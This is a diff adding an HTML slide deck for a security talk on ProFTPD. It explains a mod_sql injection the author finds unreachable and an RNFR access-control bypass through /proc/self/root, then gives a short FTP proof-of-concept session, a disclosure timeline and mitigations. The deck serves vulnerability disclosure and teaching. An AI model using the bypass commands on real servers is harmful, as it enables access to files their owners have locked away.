@@ -1,0 +1,398 @@
+<title>ProFTPD — an ACL bypass, a WONTFIX, and a 20-year-old overflow</title>
+<style>
+  :root{
+    color-scheme: dark;
+    --bg:#0e1016; --bg2:#161922; --code:#191d27; --line:#272d3a;
+    --ink:#e9e6dc; --muted:#8b93a6; --faint:#5b6376;
+    --amber:#e9a13b; --amber-soft:rgba(233,161,59,.13);
+    --red:#f2555a; --red-soft:rgba(242,85,90,.11);
+    --green:#46b96a; --green-soft:rgba(70,185,106,.11);
+    --blue:#5aa2f0; --blue-soft:rgba(90,162,240,.11);
+    --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    --mono:ui-monospace,"SF Mono","Cascadia Code","JetBrains Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    -webkit-font-smoothing:antialiased;overflow:hidden}
+  body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+    background-image:linear-gradient(var(--line) 1px,transparent 1px),
+                     linear-gradient(90deg,var(--line) 1px,transparent 1px);
+    background-size:44px 44px;opacity:.14;
+    -webkit-mask-image:radial-gradient(ellipse 80% 70% at 50% 42%,#000 40%,transparent 100%);
+            mask-image:radial-gradient(ellipse 80% 70% at 50% 42%,#000 40%,transparent 100%)}
+  .deck{position:relative;height:100vh;width:100vw;z-index:1}
+  .slide{position:absolute;inset:0;display:none;flex-direction:column;justify-content:center;
+    padding:clamp(24px,5vw,84px);padding-bottom:72px;max-width:1200px;margin:0 auto}
+  .slide.active{display:flex;animation:in .45s cubic-bezier(.2,.7,.2,1)}
+  @keyframes in{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+  @media (prefers-reduced-motion:reduce){.slide.active{animation:none}.cursor{animation:none}}
+  .eyebrow{font-family:var(--mono);font-size:.72rem;letter-spacing:.22em;text-transform:uppercase;
+    color:var(--amber);display:flex;align-items:center;gap:.6em;margin-bottom:1.1rem}
+  .eyebrow::before{content:"";width:26px;height:1px;background:var(--amber)}
+  .eyebrow.rd{color:var(--red)} .eyebrow.rd::before{background:var(--red)}
+  .eyebrow.gr{color:var(--green)} .eyebrow.gr::before{background:var(--green)}
+  h1{font-size:clamp(2.1rem,5.2vw,3.7rem);line-height:1.03;margin:0;font-weight:800;letter-spacing:-.02em;text-wrap:balance}
+  h2{font-size:clamp(1.5rem,3.3vw,2.3rem);line-height:1.08;margin:0 0 1.3rem;font-weight:750;letter-spacing:-.015em;text-wrap:balance}
+  p{font-size:clamp(1rem,1.35vw,1.12rem);line-height:1.55;color:var(--ink);max-width:64ch;margin:.55rem 0}
+  .lead{color:var(--muted)}
+  strong{color:var(--ink);font-weight:700}
+  em{font-style:normal;color:var(--amber)}
+  .am{color:var(--amber)} .rd{color:var(--red)} .gr{color:var(--green)} .bl{color:var(--blue)}
+  .mono{font-family:var(--mono)}
+  ul{margin:.4rem 0;padding-left:0;list-style:none;max-width:68ch}
+  li{font-size:clamp(1rem,1.3vw,1.1rem);line-height:1.5;color:var(--muted);padding:.28rem 0 .28rem 1.4em;position:relative}
+  li strong{color:var(--ink)} li em{color:var(--amber)}
+  li::before{content:"›";position:absolute;left:0;color:var(--amber);font-family:var(--mono)}
+  pre{background:var(--code);border:1px solid var(--line);border-radius:10px;padding:1rem 1.15rem;
+    overflow-x:auto;margin:.5rem 0;font-family:var(--mono);font-size:clamp(.72rem,1.02vw,.9rem);
+    line-height:1.65;box-shadow:0 18px 50px -30px rgba(0,0,0,.9)}
+  code{font-family:var(--mono)}
+  .ln{display:block;padding:0 .55rem;margin:0 -.55rem;border-left:2px solid transparent;color:#c7ccda;white-space:pre}
+  .ln .c{color:var(--faint)} .ln .k{color:var(--blue)} .ln .s{color:var(--green)} .ln .f{color:var(--amber)}
+  .ln.bug{background:var(--amber-soft);border-left-color:var(--amber)}
+  .ln.del{background:var(--red-soft);border-left-color:var(--red);color:#f2b8ba}
+  .ln.add{background:var(--green-soft);border-left-color:var(--green);color:#b6e6c6}
+  .ln.dim{color:var(--faint)}
+  .cols{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem;align-items:start}
+  @media (max-width:820px){.cols{grid-template-columns:1fr}}
+  .card{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:1.15rem 1.25rem}
+  .card h3{margin:0 0 .5rem;font-size:.78rem;font-family:var(--mono);letter-spacing:.14em;text-transform:uppercase;color:var(--muted);font-weight:600}
+  .card p{font-size:1rem}
+  .card.good{border-color:rgba(70,185,106,.4)} .card.good h3{color:var(--green)}
+  .card.bad{border-color:rgba(242,85,90,.42)} .card.bad h3{color:var(--red)}
+  .card.info{border-color:rgba(90,162,240,.4)} .card.info h3{color:var(--blue)}
+  table{border-collapse:collapse;width:100%;font-size:clamp(.82rem,1.15vw,1rem);margin-top:.4rem}
+  th,td{text-align:left;padding:.6rem .8rem;border-bottom:1px solid var(--line)}
+  th{font-family:var(--mono);font-size:.7rem;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);font-weight:600}
+  td.mono,th.mono{font-family:var(--mono)}
+  td .ok{color:var(--green)} td .no{color:var(--red)}
+  tr.flag td{background:var(--red-soft)}
+  .tag{display:inline-flex;align-items:center;gap:.5em;font-family:var(--mono);font-size:.74rem;
+    padding:.32em .7em;border-radius:999px;border:1px solid var(--line);color:var(--muted);letter-spacing:.04em}
+  .tag.red{color:var(--red);border-color:rgba(242,85,90,.4);background:var(--red-soft)}
+  .tag.grn{color:var(--green);border-color:rgba(70,185,106,.4);background:var(--green-soft)}
+  .tag.amb{color:var(--amber);border-color:rgba(233,161,59,.4);background:var(--amber-soft)}
+  .tag.blu{color:var(--blue);border-color:rgba(90,162,240,.4);background:var(--blue-soft)}
+  .tagrow{display:flex;flex-wrap:wrap;gap:.55rem;margin:1.1rem 0}
+  .split{display:grid;gap:.7rem;margin-top:.6rem;font-family:var(--mono);font-size:clamp(.78rem,1.05vw,.95rem)}
+  .node{background:var(--bg2);border:1px solid var(--line);border-radius:9px;padding:.7rem .95rem}
+  .fork{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+  @media (max-width:820px){.fork{grid-template-columns:1fr}}
+  .node.miss{border-color:rgba(242,85,90,.45)} .node.hit{border-color:rgba(90,162,240,.45)}
+  .node .h{font-size:.66rem;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:.35rem}
+  .node.miss .h{color:var(--red)} .node.hit .h{color:var(--blue)}
+  .kv{display:flex;flex-wrap:wrap;gap:.5rem 2rem;margin-top:.8rem;font-family:var(--mono);font-size:.84rem;color:var(--muted)}
+  .kv b{color:var(--ink);font-weight:600}
+  .quote{font-size:clamp(1.3rem,2.6vw,1.9rem);line-height:1.35;font-weight:600;letter-spacing:-.01em;
+    border-left:3px solid var(--amber);padding-left:1.1rem;margin:.4rem 0;max-width:24ch;text-wrap:balance}
+  .cite{font-family:var(--mono);font-size:.8rem;color:var(--muted);margin-top:.7rem}
+  .cursor{display:inline-block;width:.6ch;height:1.05em;background:var(--amber);vertical-align:-.14em;margin-left:.12em;animation:blink 1.05s steps(1) infinite}
+  @keyframes blink{50%{opacity:0}}
+  /* timeline */
+  .tl{display:grid;gap:0;margin-top:.5rem;border-left:2px solid var(--line);padding-left:1.3rem;max-width:74ch}
+  .tl .row{position:relative;padding:.5rem 0}
+  .tl .row::before{content:"";position:absolute;left:calc(-1.3rem - 6px);top:.85rem;width:9px;height:9px;border-radius:50%;background:var(--faint);border:2px solid var(--bg)}
+  .tl .row.hot::before{background:var(--red);box-shadow:0 0 10px var(--red)}
+  .tl .row.cve::before{background:var(--amber);box-shadow:0 0 10px var(--amber)}
+  .tl .d{font-family:var(--mono);font-size:.8rem;color:var(--amber);margin-right:.6em}
+  .tl .row.hot .d{color:var(--red)}
+  .tl .t{color:var(--muted);font-size:clamp(.92rem,1.2vw,1.04rem)}
+  .tl .t b{color:var(--ink)}
+  .foot{position:fixed;left:0;right:0;bottom:0;height:44px;z-index:3;display:flex;align-items:center;
+    justify-content:space-between;padding:0 clamp(20px,4vw,40px);font-family:var(--mono);font-size:.72rem;color:var(--faint);
+    border-top:1px solid var(--line);background:linear-gradient(0deg,var(--bg),transparent)}
+  .foot .t{color:var(--muted);letter-spacing:.04em}
+  .prog{position:fixed;top:0;left:0;height:2px;background:var(--amber);z-index:4;transition:width .35s ease;box-shadow:0 0 12px var(--amber)}
+  .nav{position:fixed;bottom:52px;right:clamp(16px,4vw,40px);z-index:5;display:flex;gap:.5rem}
+  .nav button{width:38px;height:38px;border-radius:9px;border:1px solid var(--line);background:var(--bg2);
+    color:var(--ink);font-size:1.1rem;cursor:pointer;font-family:var(--mono);transition:.15s}
+  .nav button:hover{border-color:var(--amber);color:var(--amber)}
+  .nav button:focus-visible{outline:2px solid var(--amber);outline-offset:2px}
+  .hint{position:fixed;bottom:52px;left:clamp(16px,4vw,40px);z-index:5;font-family:var(--mono);font-size:.68rem;color:var(--faint)}
+  .big{font-size:clamp(1.5rem,2.9vw,2rem);font-weight:750;line-height:1.15;letter-spacing:-.01em;text-wrap:balance;max-width:22ch}
+  .center{align-items:center;text-align:center}
+  .center p,.center .big,.center h1{margin-left:auto;margin-right:auto}
+  .center ul{text-align:left}
+</style>
+
+<div class="prog" id="prog"></div>
+<div class="deck" id="deck">
+
+  <!-- 1 · TITLE -->
+  <section class="slide center">
+    <h1>Cool ProFTPD bugs :)<span class="cursor"></span></h1>
+    <p class="mono" style="color:var(--faint);font-size:.8rem">djnn · Tokyo 2600 metup 03/07</p>
+  </section>
+
+  <!-- 2 · SQLi HOOK -->
+  <section class="slide">
+    <h2>Logging in touches SQL. The username lookup is escaped.</h2>
+    <p class="lead">ProFTPD can authenticate against SQL. On <span class="mono">USER</span>, and again on <span class="mono">PASS</span>, it looks the account up. The client-controlled name goes through the backend escaper first.</p>
+    <pre><code><span class="ln"><span class="c">/* contrib/mod_sql.c — sql_getpasswd(), on USER and again on PASS */</span></span>
+<span class="ln">realname = p->pw_name;                       <span class="c">/* the name the client sent */</span></span>
+<span class="ln add">mr = <span class="f">sql_dispatch</span>(<span class="f">sql_make_cmd</span>(cmd->tmp_pool, 2,</span>
+<span class="ln add">       MOD_SQL_DEF_CONN_NAME, realname), <span class="s">"sql_escapestring"</span>);</span>
+<span class="ln add">username = mr->data;      <span class="c">/* escaped: sqlite3_mprintf("%q") / real_escape_string */</span></span>
+<span class="ln">usrwhere = <span class="f">pstrcat</span>(cmd->tmp_pool, cmap.usrfield, <span class="s">"='"</span>, username, <span class="s">"'"</span>, NULL);</span>
+<span class="ln"></span>
+<span class="ln">where = <span class="f">sql_prepare_where</span>(SQL_PREPARE_WHERE_FL_NO_TAGS, cmd, 2, usrwhere, ...);</span>
+<span class="ln">mr = <span class="f">sql_dispatch</span>(<span class="f">sql_make_cmd</span>(cmd->tmp_pool, 5, MOD_SQL_DEF_CONN_NAME,</span>
+<span class="ln">       cmap.usrtable, cmap.usrfields, where, <span class="s">"1"</span>), <span class="s">"sql_select"</span>);</span></code></pre>
+    <p>Looks like injection. It is not.</p>
+  </section>
+
+  <!-- 3 · THE UNESCAPED ONE -->
+  <section class="slide">
+    <div class="eyebrow amb">Warm-up</div>
+    <h2>Resolving your group runs a second query. That one is injectable.</h2>
+    <pre><code><span class="ln"><span class="c">/* sql_getgroup(): login resolves your primary GID -&gt; group name */</span></span>
+<span class="ln">groupname = sd->data[0];      <span class="c">/* query 1 result: a name, straight from the DB */</span></span>
+<span class="ln"></span>
+<span class="ln"><span class="c">/* "The groupname has been escaped ... at this point."   &lt;- it has not */</span></span>
+<span class="ln bug">grpwhere = <span class="f">pstrcat</span>(cmd->tmp_pool, cmap.grpfield, <span class="s">" = '"</span>, groupname, <span class="s">"'"</span>, NULL);</span></code></pre>
+    <div class="cols">
+      <div><ul>
+        <li>Query 2 embeds a DB-sourced name with <strong>no escaping</strong>. The comment right above it claims the value was escaped. (It was not.)</li>
+        <li>On Linux, your primary group is named after you (<span class="mono">bob</span> has group <span class="mono">bob</span>). So the injected value is, effectively, your username.</li>
+      </ul></div>
+      <div class="card good">
+        <h3>however</h3>
+        <p>Second-order. The payload must already exist as a real account or group name. You do not get to pick <span class="mono">' OR 1=1--</span> as a Linux name. Identities are provisioned by the admin, not chosen at login.</p>
+      </div>
+    </div>
+    <p class="lead" style="margin-top:.6rem">A real SQL injection you cannot reach, sometimes a bug is just a bug.</p>
+  </section>
+
+  <!-- 4 · WHAT IS FTP -->
+  <section class="slide">
+    <div class="eyebrow">Context · the FTP protocol</div>
+    <h2>FTP, briefly</h2>
+    <div class="cols">
+      <div><ul>
+        <li><strong>RFC 959, 1985.</strong> One of the oldest application protocols still in heavy production use.</li>
+        <li><strong>Two channels:</strong> a control connection (port 21) carries commands/responses; a separate data connection moves bytes.</li>
+        <li><strong>Stateful & line-based:</strong> <span class="mono">USER</span> → <span class="mono">PASS</span> → <span class="mono">CWD</span> → <span class="mono">RETR</span>/<span class="mono">STOR</span>/<span class="mono">RNFR</span>+<span class="mono">RNTO</span> …</li>
+        <li><strong>Cleartext by design.</strong> TLS (FTPS) and SSH (SFTP) were bolted on much later.</li>
+      </ul></div>
+      <div class="card">
+        <h3>A rename is two commands</h3>
+        <pre style="margin:0"><code><span class="ln">&gt; RNFR oldname   <span class="c"># rename-FROM</span></span>
+<span class="ln">&lt; 350 ready for destination</span>
+<span class="ln">&gt; RNTO newname   <span class="c"># rename-TO</span></span>
+<span class="ln">&lt; 250 Rename successful</span></code></pre>
+        <p style="color:var(--muted);margin-top:.6rem"><span class="mono am">RNFR</span> selects the source file. (Remember this)</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 5 · WHAT IS PROFTPD -->
+  <section class="slide">
+    <div class="eyebrow">Context · the target</div>
+    <h2>ProFTPD</h2>
+    <div class="cols">
+      <div><ul>
+        <li><strong>First released ~1998.</strong> Lead author <strong>TJ Saunders</strong> </li>
+        <li><strong>GPLv2-or-later, written in C, ~350k LOC.</strong> Highly modular: core FTP + SFTP, TLS, SQL, LDAP, RADIUS.</li>
+        <li>Config syntax deliberately modeled on <strong>Apache httpd</strong>…</li>
+      </ul></div>
+      <div class="card info">
+        <h3>…which is why it has this</h3>
+        <pre style="margin:0"><code><span class="ln">&lt;Directory /var/www&gt;</span>
+<span class="ln">  &lt;Limit WRITE&gt;</span>
+<span class="ln">    DenyAll</span>
+<span class="ln">  &lt;/Limit&gt;</span>
+<span class="ln">&lt;/Directory&gt;</span></code></pre>
+        <p style="color:var(--muted);margin-top:.6rem">Apache-style per-path, per-command access control. That block is what our bug walks straight through.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 6 · ACL MODEL -->
+  <section class="slide">
+    <div class="eyebrow">The access-control model</div>
+    <h2>How <span class="mono bl">&lt;Directory&gt;</span> / <span class="mono bl">&lt;Limit&gt;</span> works</h2>
+    <div class="cols">
+      <div>
+        <p>ProFTPD matches the <strong>path</strong> a command targets against configured <span class="mono">&lt;Directory&gt;</span> blocks, then applies the <span class="mono">&lt;Limit&gt;</span> rules (<span class="mono">AllowAll</span>/<span class="mono">DenyAll</span>/by-user/by-group) for that command.</p>
+        <p>A file operation goes through one function:</p>
+        <pre style="margin:.4rem 0"><code><span class="ln"><span class="f">dir_check</span>(pool, cmd, group, <span class="am">path</span>, ...)</span>
+<span class="ln">  <span class="c">// returns 0 -&gt; command denied on this path</span></span></code></pre>
+      </div>
+      <div class="card bad">
+        <h3>Critical subtlety</h3>
+        <p style="color:var(--muted)"><span class="mono">&lt;Limit&gt;</span> is an <em>application policy layer</em> layered on top of Unix permissions.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 7 · THE HANDLER -->
+  <section class="slide">
+    <h2>The <span class="mono">RNFR</span> handler</h2>
+    <pre><code><span class="ln"><span class="k">MODRET</span> <span class="f">core_rnfr</span>(cmd_rec *cmd) {</span>
+<span class="ln">  path = <span class="f">pr_fs_decode_path2</span>(cmd->tmp_pool, cmd->arg, ...);  <span class="c">/* client-controlled */</span></span>
+<span class="ln">  <span class="f">pr_filter_allow_path</span>(CURRENT_CONF, path);   <span class="c">/* PathAllow/DenyFilter */</span></span>
+<span class="ln"></span>
+<span class="ln">  <span class="c">/* Allow renaming a symlink, even a dangling one. */</span></span>
+<span class="ln bug">  path = <span class="f">dir_canonical_path</span>(cmd->tmp_pool, path);       <span class="c">// (1) canonicalize</span></span>
+<span class="ln"></span>
+<span class="ln bug">  <span class="k">if</span> (path == NULL ||</span>
+<span class="ln bug">      !<span class="f">dir_check</span>(cmd->tmp_pool, cmd, cmd->group, path, NULL) ||  <span class="c">// (2) authorize</span></span>
+<span class="ln">      !<span class="f">exists2</span>(cmd->tmp_pool, path)) {          <span class="c">// (3) must exist</span></span>
+<span class="ln">    <span class="f">pr_response_add_err</span>(R_550, ...);          <span class="c">/* denied / not found */</span></span>
+<span class="ln">  }</span>
+<span class="ln">}</span></code></pre>
+    <p class="mono" style="color:var(--faint);font-size:.82rem">modules/mod_core.c · core_rnfr() · note the comment on the line above (1) — we'll come back to it</p>
+  </section>
+
+  <!-- 8 · THE ONE-LINER -->
+  <section class="slide">
+    <div class="eyebrow rd">The entire bug</div>
+    <h2><span class="mono">dir_check</span> vs <span class="mono">dir_check_canon</span></h2>
+    <p class="lead"><span class="mono">dir_canonical_path()</span> is <strong>lexical</strong>: it collapses <span class="mono">.</span> and <span class="mono">..</span> but never calls <span class="mono">readlink()</span>. So symlinks survive into the check. Now the two authorizers:</p>
+    <pre><code><span class="ln"><span class="c">/* what core_rnfr calls: matches the path STRING as-is */</span></span>
+<span class="ln del"><span class="f">dir_check</span>(pp, cmd, group, path, hidden);</span>
+<span class="ln"></span>
+<span class="ln"><span class="c">/* what RNTO, DELE, MKD call: resolves symlinks FIRST */</span></span>
+<span class="ln add"><span class="k">int</span> <span class="f">dir_check_canon</span>(pp, cmd, group, path, hidden) {</span>
+<span class="ln add">  <span class="k">return</span> <span class="f">dir_check</span>(pp, cmd, group, <span class="f">dir_best_path</span>(pp, path), hidden);</span>
+<span class="ln add">}                                 <span class="c">// dir_best_path -&gt; realpath(): follows symlinks</span></span></code></pre>
+    <div class="split"><div class="fork">
+      <div class="node hit"><div class="h">dir_check_canon (correct)</div><span class="mono bl">realpath()</span> → <span class="mono">/etc/passwd</span> → matches <span class="mono">&lt;Directory /etc&gt;</span> → <span class="gr">DENIED ✓</span></div>
+      <div class="node miss"><div class="h">dir_check (used by RNFR)</div>matches literal <span class="mono">/proc/self/root/etc/passwd</span> vs <span class="mono">/etc</span> → no match → <span class="rd">ALLOWED ✗</span></div>
+    </div></div>
+  </section>
+
+  <!-- 9 · THE PRIMITIVE -->
+  <section class="slide">
+    <div class="eyebrow rd">The primitive</div>
+    <h2><span class="mono">/proc/self/root</span> (procfs goodness)</h2>
+    <div class="cols">
+      <div>
+        <p>Linux hands every process a magic symlink at <span class="mono am">/proc/self/root</span> that always points at <strong>that process's root directory</strong>. <span class="mono">/</span> for a ProFTPD child that isn't chrooted.</p>
+        <pre style="margin-top:.3rem"><code><span class="ln"><span class="c"># to a string comparator (dir_check):</span></span>
+<span class="ln">/proc/self/root/etc/passwd  <span class="rd">≠</span>  /etc/passwd</span>
+<span class="ln"></span>
+<span class="ln"><span class="c"># to the kernel, at rename() time:</span></span>
+<span class="ln">/proc/self/root/etc/passwd  <span class="gr">→</span>  /etc/passwd</span></code></pre>
+      </div>
+      <div class="card">
+        <h3>Why it's the perfect vector</h3>
+        <ul style="margin-top:.2rem">
+          <li><strong>Always present</strong> on Linux</li>
+          <li><strong>No write access</strong> needed anywhere.</li>
+          <li>We use this, but works with <strong>any symlink</strong>.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- 10 · THE TELL -->
+  <section class="slide">
+    <div class="eyebrow rd">The tell</div>
+    <h2>awwww...you almost had it!</h2>
+    <table>
+      <thead><tr><th>Handler</th><th class="mono">canonicalize</th><th class="mono">authorize with</th><th>result</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">RNTO</td><td class="mono">dir_canonical_path</td><td class="mono">dir_check_canon</td><td><span class="ok">safe</span></td></tr>
+        <tr><td class="mono">DELE</td><td class="mono">dir_canonical_path</td><td class="mono">dir_check_canon</td><td><span class="ok">safe</span></td></tr>
+        <tr><td class="mono">MKD</td><td class="mono">dir_canonical_path</td><td class="mono">dir_check_canon</td><td><span class="ok">safe</span></td></tr>
+        <tr class="flag"><td class="mono rd">RNFR</td><td class="mono">dir_canonical_path</td><td class="mono rd">dir_check</td><td><span class="no">BYPASS</span></td></tr>
+      </tbody>
+    </table>
+    <pre style="margin-top:1rem"><code><span class="ln"><span class="c">// git log, commit 768312a91 (Bug#2321), years earlier:</span></span>
+<span class="ln">"if <span class="f">dir_canonical_path</span>() is used to obtain a path, use</span>
+<span class="ln"> <span class="f">dir_check_canon</span>() for checking &lt;Limit&gt; permissions ... instead of <span class="f">dir_check</span>()."</span></code></pre>
+  </section>
+
+  <!-- 11 · POC -->
+  <section class="slide">
+    <div class="eyebrow gr">Proof of concept · 3 commands</div>
+    <h2>Built from this tree. Run as a normal user.</h2>
+    <p class="lead">Config: a user, <strong>no</strong> <span class="mono">DefaultRoot</span>, and <span class="mono">&lt;Directory .../protected&gt; &lt;Limit ALL&gt; DenyAll</span>. Then one session:</p>
+    <pre><code><span class="ln"><span class="c">[1] baseline — the real path is denied</span></span>
+<span class="ln">  &gt; RNFR /srv/protected/secret.txt</span>
+<span class="ln del">  &lt; 550 Operation not permitted            <span class="c"># ACL enforced ✓</span></span>
+<span class="ln"></span>
+<span class="ln"><span class="c">[2] bypass — same file, one prefix</span></span>
+<span class="ln">  &gt; RNFR /proc/self/root/srv/protected/secret.txt</span>
+<span class="ln add">  &lt; 350 File or directory exists, ready ...  <span class="c"># ACL BYPASSED ✗</span></span>
+<span class="ln">  &gt; RNTO /home/attacker/stolen.txt</span>
+<span class="ln add">  &lt; 250 Rename successful                    <span class="c"># protected file relocated</span></span></code></pre>
+  </section>
+
+  <!-- 12 · TIMELINE -->
+  <section class="slide">
+    <div class="eyebrow amb">Disclosure</div>
+    <h2>disclosure timeline</h2>
+    <div class="tl">
+      <div class="row"><span class="d">2026-02-20</span><span class="t"><b>Initial private disclosure</b> to the vendor. Silence.</span></div>
+      <div class="row"><span class="d">2026-04-04</span><span class="t">Re-disclosed through <b>coordinated disclosure</b> (VulnCheck CVD).</span></div>
+      <div class="row"><span class="d">2026-04-09</span><span class="t">Vendor <b>acknowledges</b> receipt.</span></div>
+      <div class="row"><span class="d">2026-06-13</span><span class="t">CVD <b>bump</b>, still no remediation.</span></div>
+      <div class="row hot"><span class="d">2026-06-17</span><span class="t">Maintainer responds: reproduced locally but <b class="rd">WONTFIX</b>.</span></div>
+      <div class="row cve"><span class="d">2026-06-24</span><span class="t"><b>CVE-2026-35025</b> assigned · GitHub issue <span class="mono">#2170</span> opened.</span></div>
+      <div class="row hot"><span class="d">2026-07-03</span><span class="t"><b>Unfixed</b> in the current tree.</span></div>
+    </div>
+  </section>
+
+  <!-- 13 · NOT A BUG, A FEATURE -->
+  <section class="slide">
+    <div class="eyebrow amb">The verdict</div>
+    <h2>"It's not a bug, it's a feature"</h2>
+    <div class="cols" style="align-items:center">
+      <div>
+        <div class="quote">Renaming of symlinks is still a desirable behavior, and I don't want to necessarily break that.</div>
+        <div class="quote" style="margin-top:1.1rem">I don't think this behavior is severe enough to warrant code changes.</div>
+        <div class="cite">— TJ Saunders (maintainer), 2026-06-17</div>
+      </div>
+    <p class="lead" style="margin-top:.8rem">Mitigation: <span class="mono">DefaultRoot</span> (chroot, procfs disappears) or <span class="mono">PathDenyFilter ^/proc/</span>. Works with any symlink, so it doesn't really address the problem.</p>
+  </section>
+
+  <!-- 14 · CONCLUSION -->
+  <section class="slide center">
+    <div class="eyebrow">wrap</div>
+    <h1 style="font-size:clamp(1.6rem,3.7vw,2.6rem);max-width:20ch">Sometimes a bug isn't a vulnerability.<br>Sometimes a vulnerability is just a <span class="am">feature</span>.</h1>
+    <p class="mono" style="font-size:1.4rem;color:var(--muted);margin-top:.4rem">who knows? <span style="color:var(--faint)">¯\_(ツ)_/¯</span></p>
+    <div class="kv" style="justify-content:center;margin-top:1.6rem">
+      <span><b>djnn.sh</b> · questions?</span>
+    </div>
+  </section>
+
+</div>
+
+<div class="foot">
+  <span class="t">Renaming /proc/self/root — ProFTPD 1.3.10rc3</span>
+  <span><span id="cur">01</span> / <span id="tot">17</span></span>
+</div>
+<div class="hint">← → · space · home/end</div>
+<div class="nav">
+  <button id="prev" aria-label="Previous slide">‹</button>
+  <button id="next" aria-label="Next slide">›</button>
+</div>
+
+<script>
+  const slides=[...document.querySelectorAll('.slide')];
+  const prog=document.getElementById('prog');
+  const cur=document.getElementById('cur'),tot=document.getElementById('tot');
+  let i=0; tot.textContent=String(slides.length).padStart(2,'0');
+  const pad=n=>String(n+1).padStart(2,'0');
+  function show(n){
+    i=Math.max(0,Math.min(slides.length-1,n));
+    slides.forEach((s,k)=>s.classList.toggle('active',k===i));
+    prog.style.width=((i+1)/slides.length*100)+'%';
+    cur.textContent=pad(i);
+    location.hash=i+1;
+  }
+  function go(d){show(i+d)}
+  document.getElementById('next').onclick=()=>go(1);
+  document.getElementById('prev').onclick=()=>go(-1);
+  addEventListener('keydown',e=>{
+    if(['ArrowRight',' ','PageDown'].includes(e.key)){e.preventDefault();go(1)}
+    else if(['ArrowLeft','PageUp'].includes(e.key)){e.preventDefault();go(-1)}
+    else if(e.key==='Home'){e.preventDefault();show(0)}
+    else if(e.key==='End'){e.preventDefault();show(slides.length-1)}
+  });
+  const start=parseInt(location.hash.slice(1))-1;
+  show(Number.isInteger(start)&&start>=0?start:0);
+</script>
